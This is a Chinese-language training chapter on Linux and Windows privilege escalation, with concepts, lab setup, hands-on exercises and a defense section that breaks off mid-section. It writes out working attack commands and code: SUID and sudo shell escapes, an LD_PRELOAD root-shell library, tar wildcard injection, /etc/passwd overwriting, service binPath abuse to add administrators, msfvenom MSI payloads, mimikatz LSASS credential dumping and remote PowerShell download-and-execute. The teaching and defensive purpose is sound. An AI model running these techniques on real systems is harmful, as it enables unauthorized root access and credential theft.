# 第11章：权限提升（Privilege Escalation）

> **难度**：⭐⭐⭐⭐ (中高级)  
> **预计时间**：90-120分钟  
> **课程编号**：11

---

## 📋 学习目标

完成本章学习后，你将能够：

1. **理解权限提升的基本概念**
   - 掌握权限提升的定义和原理
   - 了解为什么需要权限提升
   - 识别常见的权限提升场景

2. **掌握Linux环境下的提权技术**
   - 内核漏洞利用
   - SUID/SGID程序提权
   - sudo配置滥用
   - cron定时任务利用
   - Linux Capabilities滥用
   - Docker容器逃逸

3. **掌握Windows环境下的提权技术**
   - 内核漏洞利用
   - 服务权限配置不当
   - 注册表提权
   - AlwaysInstallElevated策略利用
   - Token模拟和冒充

4. **熟练进行信息收集**
   - Linux系统信息收集命令和方法
   - Windows系统信息收集命令和方法
   - 识别潜在的提权向量

5. **使用自动化提权工具**
   - LinPEAS/WinPEAS进行自动化枚举
   - linux-exploit-suggester识别内核漏洞
   - PowerUp进行Windows提权枚举

6. **具备实战提权能力**
   - 通过实战案例巩固理论知识
   - 理解提权过程中的常见问题和解决方法
   - 掌握防御权限提升的最佳实践

---

## 📚 背景知识

### 11.1 权限提升概述

#### 11.1.1 什么是权限提升

**权限提升（Privilege Escalation）** 是网络安全领域中的一个重要概念，指在已经获得某个系统或应用程序的一定访问权限后，通过利用系统漏洞、配置错误或其他安全弱点，获取更高级别权限的过程。

在渗透测试和红队演练中，权限提升是必不可少的环节。通常情况下，攻击者最初获得的是低权限账户（如Web服务进程权限、普通用户权限），而这些权限往往受到限制，无法执行敏感操作。通过权限提升，攻击者可以获得：
- 系统管理员权限（root/Administrator）
- 访问其他用户的文件和数据
- 安装恶意软件或后门
- 横向移动到其他系统
- 持久化访问控制

#### 11.1.2 为什么需要权限提升

**1. 最初访问权限受限**

在大多数渗透测试场景中，初始立足点（Foothold）通常是：
- Web应用程序的漏洞（如SQL注入、文件上传）获得的低权限shell
- 社会工程学攻击获得的普通用户凭据
- 网络服务漏洞利用获得的有限权限
- 物理访问获得的访客权限

这些初始权限通常具有以下限制：
- 无法读取敏感系统文件
- 无法安装系统级服务
- 无法修改系统配置
- 无法访问其他用户数据
- 日志记录和监控更容易被发现

**2. 实现攻击目标的需要**

不同的攻击目标需要不同的权限级别：

| 攻击目标 | 所需权限 | 说明 |
|---------|---------|------|
| 数据窃取 | 读取权限 | 需要访问数据库文件、用户文档等 |
| 持久化控制 | 系统级权限 | 需要安装服务、修改启动项等 |
| 横向移动 | 网络访问权限 | 需要访问网络配置、凭据存储等 |
| 破坏系统 | 管理员权限 | 需要删除文件、停止服务、修改配置等 |
| 隐蔽监听 | root/System权限 | 需要加载内核模块、隐藏进程等 |

**3. 绕过安全防御机制**

许多安全防御机制依赖于权限隔离：
- **防火墙规则**：需要管理员权限修改
- **杀毒软件**：需要高权限才能禁用或绕过
- **日志审计**：需要高权限才能清除痕迹
- **入侵检测系统（IDS）**：需要高权限才能禁用或规避

#### 11.1.3 权限提升的分类

权限提升通常分为两大类：

**1. 垂直权限提升（Vertical Privilege Escalation）**

指从低权限账户提升到高权限账户的过程，例如：
- 从普通用户提升到root/Administrator
- 从服务账户提升到系统账户
- 从数据库用户提升到操作系统用户

这是最常见的权限提升形式，也是我们本章的重点内容。

**2. 水平权限提升（Horizontal Privilege Escalation）**

指在同一权限级别下，访问其他用户或进程的资源，例如：
- 用户A访问用户B的文件
- 进程A访问进程B的内存空间
- 租户A访问租户B的云资源

虽然水平权限提升不改变权限级别，但可能导致敏感信息泄露，为垂直权限提升创造条件。

#### 11.1.4 常见权限提升场景

**场景1：Web应用入侵后的提权**

```
初始立足点：通过文件上传漏洞获得Web shell（www-data权限）
↓
信息收集：发现系统运行着过时版本的Ubuntu，内核版本有漏洞
↓
提权尝试：利用内核漏洞获得root权限
↓
后续行动：安装后门、清除日志、横向移动
```

**场景2：Windows域环境提权**

```
初始立足点：通过钓鱼邮件获得普通域用户权限
↓
信息收集：使用PowerUp发现服务配置错误
↓
提权尝试：修改服务二进制文件，重启服务获得SYSTEM权限
↓
后续行动：Dump凭据、转储LSASS内存、攻击域控制器
```

**场景3：Docker容器逃逸**

```
初始立足点：获得容器内shell（容器root权限，但受Namespace限制）
↓
信息收集：发现容器以privileged模式运行，且宿主机磁盘挂载到容器
↓
提权尝试：通过挂载的磁盘访问宿主机文件系统
↓
后续行动：在宿主机上建立持久化控制
```

### 11.2 Linux权限提升基础

#### 11.2.1 Linux权限模型

Linux系统采用**自主访问控制（DAC, Discretionary Access Control）**模型，权限管理的核心概念包括：

**1. 用户和用户组**

- **用户（User）**：每个用户有唯一的UID（User ID）
  - root用户：UID为0，拥有系统最高权限
  - 系统用户：UID范围1-999，用于系统服务
  - 普通用户：UID范围1000+，登录用户

- **用户组（Group）**：每个用户组有唯一的GID（Group ID）
  - 用户可以属于多个用户组
  - 文件权限可以基于用户组设置

**2. 文件权限**

Linux文件权限分为三类：
- **读（r, read）**：查看文件内容或列出目录
- **写（w, write）**：修改文件内容或在目录中创建/删除文件
- **执行（x, execute）**：运行程序或进入目录

权限针对三个对象设置：
- **所有者（Owner）**：文件所属用户
- **所属组（Group）**：文件所属用户组
- **其他用户（Others）**：既不是所有者也不在所属组的用户

示例：
```bash
$ ls -l /etc/passwd
-rw-r--r-- 1 root root 1234 Jan 1 12:00 /etc/passwd
```
解释：
- `-rw-r--r--`：文件权限
  - 所有者（root）：读+写（rw-）
  - 所属组（root）：只读（r--）
  - 其他用户：只读（r--）
- `1`：硬链接数
- 第一个`root`：所有者
- 第二个`root`：所属组

**3. 特殊权限位**

除了标准的rwx权限，Linux还有三个特殊权限位：

- **SUID（Set User ID）**：当设置SUID位时，程序运行时以文件所有者的权限执行，而不是执行者的权限
  - 示例：`/usr/bin/passwd`（所有者root，设置SUID）允许普通用户修改自己的密码
  - 表示：权限字符串中所有者执行位显示为`s`或`S`
  
- **SGID（Set Group ID）**：类似于SUID，但使用文件所属组的权限执行
  - 对目录设置SGID：在该目录下创建的文件继承目录的组
  - 表示：权限字符串中所属组执行位显示为`s`或`S`

- **Sticky Bit（粘滞位）**：仅对目录有效，设置后只有文件所有者、目录所有者或root可以删除该目录下的文件
  - 典型示例：`/tmp`目录
  - 表示：权限字符串中其他用户执行位显示为`t`或`T`

**4. sudo机制**

`sudo`（superuser do）允许授权用户以其他用户（通常是root）的身份执行命令。

配置文件：`/etc/sudoers`

示例配置：
```
# 允许用户alice以root身份执行所有命令
alice ALL=(ALL:ALL) ALL

# 允许用户bob以root身份执行特定命令
bob ALL=(root) /usr/bin/apt, /usr/bin/systemctl

# 允许用户组admin以root身份执行所有命令，无需密码
%admin ALL=(ALL) NOPASSWD: ALL
```

sudo的滥用是Linux提权的常见途径：
- 配置不当：允许执行shell或危险命令
- 密码泄露：sudo密码被记录或猜测
- 时间戳欺骗：利用sudo的凭证缓存机制

#### 11.2.2 Linux Capabilities

**Linux Capabilities** 是Linux内核2.2引入的机制，用于将root用户的特权分解为一组独立的能力（capability），可以分配给特定的进程或二进制文件。

传统的Unix权限模型中，进程要么有root权限（UID=0），要么没有。Capabilities提供了更细粒度的权限控制。

**常见Capabilities**：

| Capability | 说明 | 安全风险 |
|-----------|------|---------|
| CAP_SYS_ADMIN | 系统管理操作（挂载文件系统等） | 极高，接近root权限 |
| CAP_NET_ADMIN | 网络管理操作 | 高，可修改网络配置 |
| CAP_SYS_MODULE | 加载/卸载内核模块 | 极高，可完全控制内核 |
| CAP_DAC_OVERRIDE | 绕过文件权限检查 | 高，可访问所有文件 |
| CAP_SETUID | 设置UID | 高，可提权到任意用户 |
| CAP_SETGID | 设置GID | 高，可提权到任意组 |
| CAP_CHOWN | 修改文件所有者 | 中，可获取文件控制权 |
| CAP_NET_RAW | 使用RAW sockets | 中，可实施网络攻击 |

**查看和设置Capabilities**：

```bash
# 查看文件capabilities
getcap -r /usr/bin /usr/sbin /usr/local/bin

# 设置capability
setcap cap_net_raw+ep /usr/bin/ping

# 移除capability
setcap -r /usr/bin/ping
```

Capabilities的滥用是近年来Linux提权的重要向量，特别是：
- CAP_SYS_ADMIN：几乎等同于root权限
- CAP_SETUID/CAP_SETGID：可以切换到任意用户
- CAP_DAC_OVERRIDE：可以绕过所有文件权限检查

#### 11.2.3 Linux环境变量和动态链接库

**1. PATH环境变量劫持**

如果sudo配置允许执行特定程序，且该程序的路径不是绝对路径，攻击者可以通过修改PATH环境变量来劫持程序执行。

示例：
```bash
# sudo配置允许执行service命令
user ALL=(root) /usr/bin/service restart

# 但攻击者可以这样做：
export PATH=/tmp:$PATH
echo '#!/bin/bash' > /tmp/service
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /tmp/service
chmod +x /tmp/service
sudo service restart  # 实际执行的是/tmp/service，获得SUID bash
```

**2. LD_PRELOAD和LD_LIBRARY_PATH**

- **LD_PRELOAD**：指定在程序启动前预加载的共享库
- **LD_LIBRARY_PATH**：指定动态链接库的搜索路径

如果这些环境变量在sudo执行时被保留，攻击者可以注入恶意共享库。

示例：
```c
// malicious.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    setuid(0);
    setgid(0);
    system("/bin/bash");
}
```

```bash
gcc -shared -fPIC -o /tmp/malicious.so malicious.c
sudo LD_PRELOAD=/tmp/malicious.so <程序>
```

#### 11.2.4 Linux定时任务（Cron）

Cron是Linux的系统定时任务服务，配置文件包括：

- **系统cron**：`/etc/crontab`、`/etc/cron.d/*`
- **用户cron**：`/var/spool/cron/crontabs/<username>`

Cron以调度用户的权限执行任务，如果是root调度的任务，则以root权限执行。

**Cron提权的常见场景**：

1. **可写脚本**：Cron执行的脚本对低权限用户可写
2. **PATH劫持**：Cron任务使用相对路径调用程序
3. **通配符扩展**：Cron任务中使用通配符可能被注入
4. **环境变量**：Cron任务继承的环境变量可被修改

示例（通配符注入）：
```bash
# root的cron任务
* * * * * root cd /tmp && tar -cf /backup/backup.tar *

# 攻击者可以在/tmp目录创建特殊命名的文件
touch /tmp/--checkpoint=1
touch /tmp/--checkpoint-action=exec=sh\ exploit.sh
# 当tar执行时，会执行exploit.sh（以root权限）
```

### 11.3 Windows权限提升基础

#### 11.3.1 Windows权限模型

Windows采用**访问控制模型（Access Control Model）**，核心概念包括：

**1. 安全主体（Security Principals）**

- **用户账户**：
  - Administrator：内置管理员账户
  - 普通用户账户
  - 服务账户

- **用户组**：
  - Administrators：管理员组
  - Users：普通用户组
  - SYSTEM：系统账户（最高权限）
  - Network Service、Local Service：服务账户

- **计算机账户**：域环境中的计算机标识

**2. 访问控制列表（ACL, Access Control List）**

Windows使用ACL来管理对象（文件、注册表键、服务等）的访问权限：

- **DACL（Discretionary ACL）**：定义哪些用户/组可以访问对象
- **SACL（System ACL）**：定义哪些访问尝试需要被审计

每个ACL包含多个**访问控制项（ACE, Access Control Entry）**，指定特定用户/组的权限。

**3. 访问令牌（Access Token）**

当用户登录时，Windows创建访问令牌，包含：
- 用户SID（Security Identifier）
- 用户所属组的SID
- 特权列表（Privileges）
- 默认DACL

进程使用访问令牌来确定对资源的访问权限。

**4. 完整性级别（Integrity Level）**

Windows引入完整性级别来实现强制完整性控制（MIC）：
- Low：受限进程（如IE保护模式）
- Medium：普通用户进程
- High：管理员进程（即使UAC启用）
- System：系统进程

即使以管理员身份运行，如果进程完整性级别不是System，仍受到一些限制。

#### 11.3.2 Windows服务

Windows服务是在后台运行的长期进程，通常以SYSTEM、LocalSystem、NetworkService或LocalService账户运行。

**服务配置的关键属性**：

- **BinaryPathName**：服务可执行文件的路径
- **Start**（启动类型）：自动、手动、禁用
- **ObjectName**：服务运行的账户
- **Permissions**：哪些用户可以启动、停止、配置服务

**服务提权的常见场景**：

1. **服务二进制文件可写**：攻击者可以替换服务程序
2. **服务配置可修改**：攻击者可以修改服务的配置（如BinaryPathName）
3. **服务权限配置不当**：低权限用户可以启动/停止服务
4. **DLL劫持**：服务加载的DLL可以被替换

示例（使用sc命令）：
```cmd
# 查看服务配置
sc qc <servicename>

# 修改服务二进制路径（需要适当权限）
sc config <servicename> binPath= "C:\temp\malicious.exe"
```

#### 11.3.3 Windows注册表

注册表是Windows的系统数据库，存储配置信息。不当的注册表权限配置可能导致提权。

**提权相关的注册表路径**：

1. **服务相关**：
   - `HKLM\SYSTEM\CurrentControlSet\Services\<ServiceName>`
   - 如果低权限用户可以修改服务配置，可以提权

2. **AlwaysInstallElevated**：
   - `HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated`
   - `HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated`
   - 如果两个键都设置为1，任何用户可以安装MSI包，且以高权限执行

3. **映像劫持（Image File Execution Options）**：
   - `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options`
   - 可以设置调试器来劫持程序执行

#### 11.3.4 Windows令牌和模拟

**访问令牌（Access Token）**是Windows表示进程或线程安全上下文的对象。

**令牌类型**：
- **主令牌（Primary Token）**：代表进程的安全上下文
- **模拟令牌（Impersonation Token）**：代表其他用户的安全上下文

**令牌模拟级别**：
- Anonymous：无法识别客户端
- Identification：可以识别客户端，但不能模拟
- Impersonation：可以在同一机器上模拟客户端
- Delegation：可以远程模拟客户端

**提权场景**：
1. **令牌模拟**：如果进程有`SeImpersonatePrivilege`特权，可以模拟其他用户的令牌
2. **令牌窃取**：从其他进程复制令牌
3. **利用命名管道**：通过命名管道让高权限进程连接，获得其令牌

典型利用：`SeImpersonatePrivilege`或`SeAssignPrimaryTokenPrivilege`特权的滥用（如Juicy Potato、RoguePotato等工具）。

#### 11.3.5 Windows内核漏洞

Windows内核漏洞原理类似Linux，但由于Windows的闭源特性，漏洞发现和利用更加困难。

**常见内核漏洞类型**：
- 空指针解引用
- 缓冲区溢出
- 类型混淆
- 释放后使用（UAF）
- 竞态条件

**利用挑战**：
- 需要绕过内核保护机制（如KASLR、DEP、CFG等）
- 需要精确的偏移和ROP链构造
- 不同Windows版本和补丁级别需要不同的exploit

---

## 🧪 实验环境

### 环境要求

为了安全地学习和练习权限提升技术，我们需要搭建隔离的实验环境。

#### 11.4.1 Linux实验环境

**推荐靶机**：

1. **VulnHub虚拟机**
   - Basic Pentesting 1
   - Kioptrix Level 1-5
   - SickOs 1.2
   - HackLAB: Vulnix

2. **在线平台**
   - TryHackMe: Linux Privilege Escalation模块
   - HackTheBox: 入门级Linux机器
   - OverTheWire: Bandit（基础权限操作）

3. **本地搭建**
   - 故意配置不当的Ubuntu/Debian虚拟机
   - 安装过时内核和有漏洞的软件包

**环境配置示例**：

```bash
# 安装过时内核（仅用于实验环境）
sudo apt install linux-image-4.4.0-21-generic linux-headers-4.4.0-21-generic

# 配置有漏洞的sudo版本
sudo apt install sudo=1.8.20p1-1ubuntu5

# 设置SUID程序
sudo cp /bin/bash /tmp/suid_bash
sudo chmod 4755 /tmp/suid_bash

# 创建有问题的cron任务
echo '* * * * * root /tmp/backup.sh' | sudo tee -a /etc/crontab
```

#### 11.4.2 Windows实验环境

**推荐靶机**：

1. **VulnHub Windows虚拟机**
   - Sick0sWindows
   - Blue

2. **TryHackMe房间**
   - Windows Privilege Escalation
   - Attacktive Directory

3. **本地搭建**
   - Windows 7 SP1（未打补丁）
   - Windows Server 2008 R2（故意配置不当）

**环境配置示例**：

```powershell
# 配置AlwaysInstallElevated
reg add "HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer" /v AlwaysInstallElevated /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" /v AlwaysInstallElevated /t REG_DWORD /d 1 /f

# 创建弱权限服务
sc create VulnService binPath= "C:\temp\service.exe" start= auto
icacls "C:\temp\service.exe" /grant Everyone:F

# 配置可写的注册表键
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\temp\backdoor.exe" /f
```

#### 11.4.3 工具准备

**Linux提权工具**：

1. **LinPEAS**（Linux Privilege Escalation Awesome Script）
   ```bash
   # 下载LinPEAS
   curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh
   chmod +x linpeas.sh
   ```

2. **linux-exploit-suggester**
   ```bash
   # 下载
   wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
   chmod +x linux-exploit-suggester.sh
   ```

3. **Linux Smart Enumeration**
   ```bash
   wget https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh
   chmod +x lse.sh
   ```

**Windows提权工具**：

1. **WinPEAS**
   ```powershell
   # 下载WinPEAS
   Invoke-WebRequest -Uri "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winpeasany.exe" -OutFile "winpeas.exe"
   ```

2. **PowerUp**
   ```powershell
   # 导入PowerUp模块
   Import-Module .\PowerUp.ps1
   
   # 或者从内存执行
   IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1')
   ```

3. **Windows Exploit Suggester**
   ```bash
   # 下载
   git clone https://github.com/AonCyberLabs/Windows-Exploit-Suggester
   ```

---

## 🔬 实验步骤

### 实验1：Linux SUID提权

#### 实验目的
通过SUID程序提权到root。

#### 实验环境
- Ubuntu 16.04虚拟机
- 已获得低权限shell（如www-data）

#### 实验步骤

**步骤1：信息收集 - 查找SUID程序**

```bash
# 查找所有SUID程序
find / -perm -4000 -type f 2>/dev/null

# 更详细的查找
find / -type f -perm -u+s 2>/dev/null | xargs ls -la
```

**步骤2：分析SUID程序**

常见的SUID程序：
- `/usr/bin/passwd`：正常，用于修改密码
- `/usr/bin/sudo`：正常，用于执行sudo
- `/usr/bin/su`：正常，用于切换用户
- 其他非标准SUID程序：需要重点分析

**步骤3：利用SUID bash**

如果发现SUID版本的bash：

```bash
# 检查是否有SUID bash
find / -type f -perm -u+s 2>/dev/null | grep bash

# 如果存在，直接运行
/tmp/suid_bash -p
# -p 参数保持权限，不重置UID
```

**步骤4：利用SUID程序的功能**

许多程序有意外提权风险：

1. **find命令**
   ```bash
   # 如果find有SUID位
   find / -exec '/bin/sh' -p \;
   ```

2. **vim/vi**
   ```bash
   # 如果vim有SUID位
   vim -c ':!/bin/sh'
   ```

3. **less/more**
   ```bash
   # 在less中按!进入shell
   less /etc/passwd
   !/bin/sh
   ```

4. **nmap**（旧版本）
   ```bash
   # 交互模式
   nmap --interactive
   nmap> !sh
   ```

5. **cp/mv**
   ```bash
   # 如果cp有SUID位，可以覆盖/etc/shadow或/etc/passwd
   ```

**步骤5：利用示例 - SUID tar**

```bash
# 如果tar有SUID位
cd /tmp
echo "root2:\$1\$To1rvV5w\$/oOf5aOX4YaxEKQk8KijK.:0:0:root:/root:/bin/bash" > /tmp/passwd_add
# 将root2条目添加到/etc/passwd
tar -cf /etc/passwd /tmp/passwd_add  # 这会覆盖/etc/passwd
# 然后su root2，密码为自定义密码
```

#### 实验结果
成功通过SUID程序获得root权限。

---

### 实验2：Linux sudo配置滥用

#### 实验目的
通过滥用sudo配置提权。

#### 实验环境
- Ubuntu虚拟机
- 用户有sudo权限但受限制

#### 实验步骤

**步骤1：检查sudo权限**

```bash
# 查看当前用户的sudo权限
sudo -l

# 输出示例：
# User www-data may run the following commands:
# (root) NOPASSWD: /usr/bin/find
# (root) NOPASSWD: /usr/bin/vim
# (root) NOPASSWD: /usr/bin/python
```

**步骤2：利用允许的程序**

1. **find**
   ```bash
   sudo find / -exec '/bin/sh' \;
   ```

2. **vim**
   ```bash
   sudo vim -c '!sh'
   ```

3. **python**
   ```bash
   sudo python -c 'import os; os.system("/bin/sh")'
   ```

4. **apt**
   ```bash
   sudo apt update -o APT::Update::Pre-Invoke::=/bin/sh
   ```

5. **systemctl**
   ```bash
   # 创建恶意service文件
   echo '[Service]\nExecStart=/bin/sh -c "cp /bin/sh /tmp/rootshell && chmod +s /tmp/rootshell"\n[Install]\nWantedBy=multi-user.target' > /tmp/rootshell.service
   sudo systemctl link /tmp/rootshell.service
   sudo systemctl start rootshell.service
   /tmp/rootshell -p
   ```

6. **env**
   ```bash
   sudo env /bin/sh
   ```

**步骤3：LD_PRELOAD劫持**

如果sudo配置允许LD_PRELOAD：

```bash
# 检查sudo是否允许LD_PRELOAD
sudo -l
# 输出中可能包含：env_keep+=LD_PRELOAD

# 创建恶意共享库
cat > exploit.c <<EOF
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    setuid(0);
    setgid(0);
    system("/bin/bash");
}
EOF

gcc -shared -fPIC -o /tmp/exploit.so exploit.c

# 执行
sudo LD_PRELOAD=/tmp/exploit.so service restart
```

#### 实验结果
成功通过sudo配置滥用获得root权限。

---

### 实验3：Windows服务提权

#### 实验目的
通过Windows服务配置错误提权。

#### 实验环境
- Windows 7/10虚拟机
- 已获得低权限shell

#### 实验步骤

**步骤1：信息收集 - 枚举服务**

```powershell
# 使用PowerUp
Import-Module .\PowerUp.ps1
Invoke-AllChecks

# 手动枚举服务
Get-Service | Where-Object {$_.Status -eq "Running"}
sc query
wmic service list brief
```

**步骤2：识别弱权限服务**

```powershell
# 使用PowerUp检查服务权限
Get-ModifiableService

# 手动检查服务配置
sc qc <ServiceName>

# 检查服务二进制文件的权限
icacls "C:\path\to\service.exe"
```

**步骤3：利用弱权限服务**

如果服务二进制文件对当前用户可写：

```cmd
# 1. 停止服务
sc stop <ServiceName>

# 2. 替换服务二进制文件
echo '#include <stdlib.h>\nint main() { system("net user hacker Password123! /add"); system("net localgroup administrators hacker /add"); return 0; }' > malicious.c
gcc malicious.c -o malicious.exe

copy malicious.exe "C:\path\to\service.exe" /Y

# 3. 重启服务
sc start <ServiceName>
```

如果无法停止服务，可以配置服务在重启后执行：

```cmd
# 修改服务配置
sc config <ServiceName> binPath= "C:\temp\malicious.exe"
sc config <ServiceName> obj= ".\LocalSystem" password= ""

# 等待系统重启或服务重启
```

**步骤4：利用服务权限**

如果当前用户可以修改服务的配置（但二进制文件不可写）：

```cmd
# 修改服务的binPath
sc config <ServiceName> binPath= "cmd /c net localgroup administrators %username% /add"

# 启动服务（会以SYSTEM权限执行）
sc start <ServiceName>
```

#### 实验结果
成功通过Windows服务配置错误获得SYSTEM权限。

---

### 实验4：Windows AlwaysInstallElevated提权

#### 实验目的
通过AlwaysInstallElevated策略提权。

#### 实验环境
- Windows 7/10虚拟机
- 已获得低权限shell

#### 实验步骤

**步骤1：检查AlwaysInstallElevated配置**

```cmd
reg query "HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer" /v AlwaysInstallElevated
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" /v AlwaysInstallElevated
```

如果两个键都存在且值为1，则可以提权。

**步骤2：创建恶意MSI包**

```bash
# 使用msfvenom创建恶意MSI
msfvenom -p windows/adduser USER=hacker PASS=Password123! -f msi -o adduser.msi

# 或者创建执行命令的MSI
msfvenom -p windows/exec CMD="net localgroup administrators %username% /add" -f msi -o exploit.msi
```

**步骤3：执行MSI包**

```cmd
# 以高权限执行MSI
msiexec /quiet /qn /i exploit.msi
```

#### 实验结果
成功通过AlwaysInstallElevated获得管理员权限。

---

## 💡 解题技巧

### Linux提权技巧

#### 技巧1：系统化信息收集

提权的成功率很大程度上取决于信息收集的质量。建议按照以下顺序进行：

```bash
# 1. 系统信息
uname -a
cat /etc/os-release
cat /etc/issue

# 2. 用户信息
id
whoami
cat /etc/passwd
cat /etc/group
sudo -l

# 3. 文件系统
find / -perm -4000 -type f 2>/dev/null  # SUID
find / -perm -2000 -type f 2>/dev/null  # SGID
getcap -r / 2>/dev/null                 # Capabilities

# 4. 网络信息
ip addr
ip route
netstat -tulpn

# 5. 定时任务
cat /etc/crontab
ls -la /etc/cron.d/
crontab -l

# 6. 已安装软件
dpkg -l
rpm -qa
```

#### 技巧2：使用自动化工具但不完全依赖

LinPEAS等工具可以快速发现潜在的提权向量，但需要人工验证：

```bash
# 运行LinPEAS
./linpeas.sh -a

# 重点关注以下输出：
# - [+] Users and Groups
# - [+] System Information
# - [+] Processes, Crons, Services and Timers
# - [+] Network
# - [+] Packages
# - [+] Useful Software
# - [+] Interesting Files
```

#### 技巧3：内核漏洞利用的注意事项

1. **确认内核版本**
   ```bash
   uname -r
   cat /proc/version
   ```

2. **使用linux-exploit-suggester**
   ```bash
   ./linux-exploit-suggester.sh
   ```

3. **下载和编译exploit**
   ```bash
   # 在Kali上下载exploit
   searchsploit linux kernel 4.4
   
   # 传输到目标机器
   wget http://<kali-ip>/exploit.c
   
   # 编译
   gcc -o exploit exploit.c
   ```

4. **测试exploit前先备份**
   - 内核exploit有导致系统崩溃的风险
   - 在实验环境中测试
   - 生产环境谨慎使用

#### 技巧4：利用环境变量

1. **检查sudo是否保留环境变量**
   ```bash
   sudo -l
   # 查看env_keep设置
   ```

2. **PATH劫持**
   ```bash
   # 如果sudo执行的程序不是绝对路径
   export PATH=/tmp:$PATH
   echo '#!/bin/bash' > /tmp/<program>
   echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /tmp/<program>
   chmod +x /tmp/<program>
   sudo <program>
   ```

#### 技巧5：Docker容器内的提权

如果初始shell在Docker容器内：

```bash
# 检查是否在容器内
cat /proc/1/cgroup
ls -la /.dockerenv

# 检查容器特权模式
capsh --print | grep Current

# 如果容器以privileged模式运行
# 可以尝试挂载宿主机磁盘
mount /dev/sda1 /mnt
# 然后访问宿主机文件系统

# 检查是否有docker socket挂载
ls -la /var/run/docker.sock
# 如果有，可以在容器内控制docker，启动新容器挂载宿主机
```

### Windows提权技巧

#### 技巧1：快速信息收集

```powershell
# 系统信息
systeminfo
wmic os get osarchitecture,version

# 用户信息
whoami /all
net user
net localgroup

# 网络信息
ipconfig /all
netstat -ano

# 补丁信息
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

#### 技巧2：使用PowerUp系统化枚举

```powershell
# 导入PowerUp
Import-Module .\PowerUp.ps1

# 运行所有检查
Invoke-AllChecks

# 具体检查项目：
# - Get-SystemPrivilege：检查特权
# - Get-ModifiableService：检查服务权限
# - Get-RegAlwaysInstallElevated：检查AlwaysInstallElevated
# - Get-UnattendedInstallFile：检查无人值守安装文件
# - Get-Webconfig：检查web.config中的凭据
# - Get-ApplicationHost：检查applicationHost.config
# - Get-ScheduledTask：检查计划任务
```

#### 技巧3：内核漏洞利用

```powershell
# 使用Windows Exploit Suggester
python windows-exploit-suggester.py --database 2021-05-10-mssb.xls --systeminfo systeminfo.txt

# 手动搜索exploit
searchsploit windows 7 x64
```

#### 技巧4：Token模拟和Potato攻击

如果当前用户有`SeImpersonatePrivilege`或`SeAssignPrimaryTokenPrivilege`特权：

```powershell
# 使用Juicy Potato
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c {04CER57-0000-0000-0000-00000000007}

# 使用PrintSpoofer（Windows 10/Server 2019）
PrintSpoofer.exe -i -c cmd
```

#### 技巧5：凭据收集

即使无法直接提权，收集凭据可能帮助间接提权：

```powershell
# SAM和LSA Secrets（需要SYSTEM权限）
# 但可以尝试从内存提取

# 使用mimikatz（需要管理员权限）
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit

# 从内存转储
procdump.exe -ma lsass.exe lsass.dmp
# 离线分析
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" exit
```

---

## 🛡️ 防御措施

### Linux系统防御

#### 1. 最小权限原则

- **不使用root运行服务**：Web服务器、数据库等服务应使用专用低权限用户
- **限制sudo使用**：
  - 仅授予必要用户sudo权限
  - 使用命令别名限制可执行的命令
  - 避免使用NOPASSWD（除非必要）
  
  ```
  # 好的配置
  admin ALL=(ALL) /usr/bin/apt, /usr/bin/systemctl restart apache2
  
  # 避免的配置
  admin ALL=(ALL) NOPASSWD: ALL
  ```

#### 2. 定期更新和补丁

```bash
# 自动安全更新
sudo apt install unattended-upgrades
sudo dpkg-reconfigure -plow unattended-upgrades
```

#### 3. 限制SUID/SGID程序

```bash
# 查找不必要的SUID程序
find / -perm -4000 -type f

# 移除不必要的SUID位
sudo chmod u-s /path/to/program
```

#### 4. 使用Linux Capabilities替代SUID

```bash
# 移除SUID，使用capabilities
sudo chmod u-s /usr/bin/ping
sudo setcap cap_net_raw+ep /usr/bin/ping
```

#### 5. 限制cron任务

- 仅root可以编辑系统cron文件
- 使用绝对路径
- 避免通配符
- 定期审计cron任务

#### 6. 启用安全模块

- **AppArmor**：限制程序的能力
- **SELinux**：强制访问控制
- **grsecurity**：增强内核安全性

#### 7. 文件系统安全

```bash
# 挂载选项
# /etc/fstab示例
/dev/sda1 / ext4 defaults,noexec,nosuid,nodev 0 1

# noexec：禁止执行二进制文件
# nosuid：忽略SUID/SGID位
# nodev：禁止设备文件
```

#### 8. 审计和监控

```bash
# 使用auditd监控敏感文件
sudo apt install auditd
sudo auditctl -w /etc/passwd -p wa -k passwd_changes
sudo auditctl -w /etc/shadow -p wa -k shadow_changes
sudo auditctl -w /usr/bin/sudo -p x -k sudo_usage
```

### Windows系统防御

#### 1. 及时安装补丁

- 启用Windows Update自动更新
- 定期使用WSUS或SCCM分发补丁
- 优先安装安全补丁

#### 2. 最小权限原则

- **不使用Administrator账户**：创建专用管理员账户
- **用户账户控制（UAC）**：保持启用，不要禁用
- **服务账户**：使用低权限服务账户

#### 3. 服务安全配置

```powershell
# 检查服务权限
Get-Service | ForEach-Object {
    $service = $_.Name
    $acl = Get-Acl "HKLM:\SYSTEM\CurrentControlSet\Services\$service"
    $acl.Access | Where-Object {$_.IdentityReference -notlike "NT AUTHORITY\*"}
}

# 使用Managed Service Accounts
# 避免服务账户使用弱密码
```

#### 4. 注册表安全

```powershell
# 检查AlwaysInstallElevated
